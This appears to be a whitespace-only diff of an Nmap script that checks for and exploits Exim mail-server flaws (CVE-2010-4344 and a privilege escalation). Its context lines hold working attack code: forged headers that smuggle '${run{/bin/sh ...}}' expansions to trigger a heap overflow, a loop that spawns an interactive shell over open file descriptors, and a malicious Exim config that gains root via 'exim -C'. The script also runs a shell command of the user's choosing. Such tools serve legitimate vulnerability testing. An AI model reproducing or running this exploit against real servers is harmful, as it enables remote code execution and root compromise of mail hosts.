@@ -75,7 +75,7 @@ categories = {"exploit", "intrusive", "vuln"}
 
 
 portrule = shortport.port_or_service({25, 465, 587},
-                {"smtp", "smtps", "submission"})
+  {"smtp", "smtps", "submission"})
 
 local function smtp_finish(socket, status, msg)
   if socket then
@@ -109,21 +109,21 @@ local function escalate_privs(socket, smtp_opts)
   local tmp_file = "/tmp/nmap"..tostring(math.random(0x0FFFFF, 0x7FFFFFFF))
   local exim_run = "exim -C"..tmp_file.." -q"
   local exim_spool = "spool_directory = \\${run{/bin/sh -c 'id > "..
-                     tmp_file.."' }}"
+  tmp_file.."' }}"
 
   stdnse.print_debug(2, "%s: trying to escalate privileges",
-        SCRIPT_NAME)
+    SCRIPT_NAME)
 
   local status, ret = send_recv(socket, "id\n")
   if not status then
     return status, ret
   end
   results = string.format("    Before 'id': %s",
-                string.gsub(ret, "^%$*%s*(.-)\n*%$*$", "%1"))
+    string.gsub(ret, "^%$*%s*(.-)\n*%$*$", "%1"))
 
   status, ret = send_recv(socket,
-                          string.format("cat > %s << EOF\n",
-                              tmp_file))
+    string.format("cat > %s << EOF\n",
+    tmp_file))
   if not status then
     return status, ret
   end
@@ -144,10 +144,10 @@ local function escalate_privs(socket, smtp_opts)
   elseif ret:match("uid=0%(root%)") then
     exploited = true
     results = results..string.format("\n    After  'id': %s",
-                string.gsub(ret, "^%$*%s*(.-)\n*%$*$", "%1"))
+      string.gsub(ret, "^%$*%s*(.-)\n*%$*$", "%1"))
     stdnse.print_debug(2,
-        "%s: successfully exploited the Exim privileges escalation.",
-        SCRIPT_NAME)
+      "%s: successfully exploited the Exim privileges escalation.",
+      SCRIPT_NAME)
   end
 
   -- delete tmp file, should we care about this ?
@@ -164,7 +164,7 @@ local function exploit_heap(socket, smtp_opts)
   local exploited, ret = false, ""
 
   stdnse.print_debug(2, "%s: exploiting the heap overflow",
-        SCRIPT_NAME)
+    SCRIPT_NAME)
 
   local status, response = smtp.mail(socket, smtp_opts.mailfrom)
   if not status then
@@ -185,14 +185,14 @@ local function exploit_heap(socket, smtp_opts)
   local msg_len, log_buf_size = smtp_opts.size + (1024*256), 8192
   local log_buf = "YYYY-MM-DD HH:MM:SS XXXXXX-YYYYYY-ZZ rejected from"
   local log_host = string.format("%s(%s)",
-                      smtp_opts.ehlo_host ~= smtp_opts.domain and
-                      smtp_opts.ehlo_host.." " or "",
-                      smtp_opts.domain)
+    smtp_opts.ehlo_host ~= smtp_opts.domain and
+    smtp_opts.ehlo_host.." " or "",
+    smtp_opts.domain)
   log_buf = string.format("%s <%s> H=%s [%s]: message too big: "..
-              "read=%s max=%s\nEnvelope-from: <%s>\nEnvelope-to: <%s>\n",
-              log_buf, smtp_opts.mailfrom, log_host, smtp_opts.domain_ip,
-              msg_len, smtp_opts.size, smtp_opts.mailfrom,
-              smtp_opts.mailto)
+    "read=%s max=%s\nEnvelope-from: <%s>\nEnvelope-to: <%s>\n",
+    log_buf, smtp_opts.mailfrom, log_host, smtp_opts.domain_ip,
+    msg_len, smtp_opts.size, smtp_opts.mailfrom,
+    smtp_opts.mailto)
 
   log_buf_size = log_buf_size - 3
   local filler, hdrs, nmap_hdr = string.rep("X", 8 * 16), "", "NmapHeader"
@@ -221,7 +221,7 @@ local function exploit_heap(socket, smtp_opts)
     for fd = 3, 12 do
       hdrx = hdrx..
       string.format("${run{/bin/sh -c 'exec /bin/sh -i <&%d >&0 2>&0'}} ",
-          fd)
+        fd)
     end
   end
 
@@ -231,7 +231,7 @@ local function exploit_heap(socket, smtp_opts)
   end
 
   stdnse.print_debug(1, "%s: sending forged mail, size: %dMB",
-        SCRIPT_NAME, msg_len / (1024*1024))
+    SCRIPT_NAME, msg_len / (1024*1024))
 
   -- use low socket level functions.
   status, ret = socket:send(hdrs)
@@ -279,24 +279,24 @@ local function exploit_heap(socket, smtp_opts)
   end
 
   stdnse.print_debug(2, "%s: the forged mail was sent successfully.",
-      SCRIPT_NAME)
+    SCRIPT_NAME)
 
   -- second round
   status, response = smtp.query(socket, "MAIL",
-                      string.format("FROM:<%s>", smtp_opts.mailfrom))
+    string.format("FROM:<%s>", smtp_opts.mailfrom))
   if not status then
     return status, response
   end
 
   status, ret = smtp.query(socket, "RCPT",
-                  string.format("TO:<%s>", smtp_opts.mailto))
+    string.format("TO:<%s>", smtp_opts.mailto))
   if not status then
     return status, ret
   end
 
   if response:match("sh:%s") or ret:match("sh:%s") then
     stdnse.print_debug(2,
-        "%s: successfully exploited the Exim heap overflow.", SCRIPT_NAME)
+      "%s: successfully exploited the Exim heap overflow.", SCRIPT_NAME)
     exploited = "heap-exploited"
   end
 
@@ -314,11 +314,11 @@ local function check_exim(smtp_opts)
   local exim_heap_result, exim_priv_result = "", ""
 
   local socket, ret = smtp.connect(smtp_opts.host,
-                          smtp_opts.port,
-                          {ssl = true,
-                          timeout = 8000,
-                          recv_before = true,
-                          lines = 1})
+    smtp_opts.port,
+    {ssl = true,
+      timeout = 8000,
+      recv_before = true,
+    lines = 1})
 
   if not socket then
     return smtp_finish(nil, socket, ret)
@@ -332,31 +332,31 @@ local function check_exim(smtp_opts)
     smtp_server.smtpd = smtp_server.banner:match("Exim")
     if smtp_server.smtpd and smtp_server.version then
       table.insert(out, 1,
-          string.format("Exim version: %.02f", smtp_server.version))
+        string.format("Exim version: %.02f", smtp_server.version))
 
       if smtp_server.version > exim_heap_ver then
         exim_heap_result = string.format("  Exim (%s): NOT VULNERABLE",
-                                         heap_cve)
+          heap_cve)
       else
         exim_heap_result = string.format("  Exim (%s): LIKELY VULNERABLE",
-                                         heap_cve)
+          heap_cve)
       end
 
       if smtp_server.version > exim_priv_ver then
         exim_priv_result = string.format("  Exim (%s): NOT VULNERABLE",
-                                         priv_cve)
+          priv_cve)
       else
         exim_priv_result = string.format("  Exim (%s): LIKELY VULNERABLE",
-                                         priv_cve)
+          priv_cve)
       end
 
     else
       return smtp_finish(socket, true,
-                'The SMTP server is not Exim: NOT VULNERABLE')
+        'The SMTP server is not Exim: NOT VULNERABLE')
     end
   else
     return smtp_finish(socket, false,
-              'failed to read the SMTP banner.')
+      'failed to read the SMTP banner.')
   end
 
   if not smtp_opts.exploit then
@@ -377,7 +377,7 @@ local function check_exim(smtp_opts)
   for _, line in pairs(stdnse.strsplit("\r?\n", response)) do
     if not smtp_opts.ehlo_host or not smtp_opts.domain_ip then
       smtp_opts.ehlo_host, smtp_opts.domain_ip =
-            line:match("%d+.*Hello%s(.*)%s%[(.*)%]")
+      line:match("%d+.*Hello%s(.*)%s%[(.*)%]")
     end
     if not smtp_server.size then
       smtp_server.size = line:match("%d+%-SIZE%s(%d+)")
@@ -402,8 +402,8 @@ local function check_exim(smtp_opts)
   end
   if not smtp_opts.mailto then
     smtp_opts.mailto = string.format("postmaster@%s",
-                          smtp_opts.host.targetname and
-                          smtp_opts.host.targetname or 'localhost')
+      smtp_opts.host.targetname and
+      smtp_opts.host.targetname or 'localhost')
   end
 
   status, ret = exploit_heap(socket, smtp_opts)
@@ -411,20 +411,20 @@ local function check_exim(smtp_opts)
     return smtp_finish(nil, status, ret)
   elseif ret then
     exim_heap_result = string.format("  Exim (%s): VULNERABLE",
-                          heap_cve)
+      heap_cve)
     exim_priv_result = string.format("  Exim (%s): VULNERABLE",
-                          priv_cve)
+      priv_cve)
     if ret:match("exploited") then
       -- clear socket
       socket:receive_lines(1)
       if smtp_opts.shell_cmd then
         status, response = send_recv(socket,
-                              string.format("%s\n", smtp_opts.shell_cmd))
+          string.format("%s\n", smtp_opts.shell_cmd))
         if status then
           exim_heap_result = exim_heap_result ..
-            string.format("\n    Shell command '%s': %s",
-                          smtp_opts.shell_cmd,
-                          string.gsub(response, "^%$*%s*(.-)\n*%$*$", "%1"))
+          string.format("\n    Shell command '%s': %s",
+            smtp_opts.shell_cmd,
+            string.gsub(response, "^%$*%s*(.-)\n*%$*$", "%1"))
         end
       end
 
@@ -436,7 +436,7 @@ local function check_exim(smtp_opts)
     end
   else
     exim_heap_result = string.format("  Exim (%s): NOT VULNERABLE",
-                          heap_cve)
+      heap_cve)
   end
 
   table.insert(out, 3, exim_heap_result)
@@ -449,12 +449,12 @@ action = function(host, port)
     host = host,
     port = port,
     domain = stdnse.get_script_args('smtp.domain') or
-                'nmap.scanme.org',
+    'nmap.scanme.org',
     mailfrom = stdnse.get_script_args('smtp-vuln-cve2010-4344.mailfrom'),
     mailto = stdnse.get_script_args('smtp-vuln-cve2010-4344.mailto'),
     exploit = stdnse.get_script_args('smtp-vuln-cve2010-4344.exploit'),
     shell_cmd = stdnse.get_script_args('exploit.cmd') or
-                  stdnse.get_script_args('smtp-vuln-cve2010-4344.cmd'),
+    stdnse.get_script_args('smtp-vuln-cve2010-4344.cmd'),
   }
   if smtp_opts.shell_cmd then
     smtp_opts.exploit = true
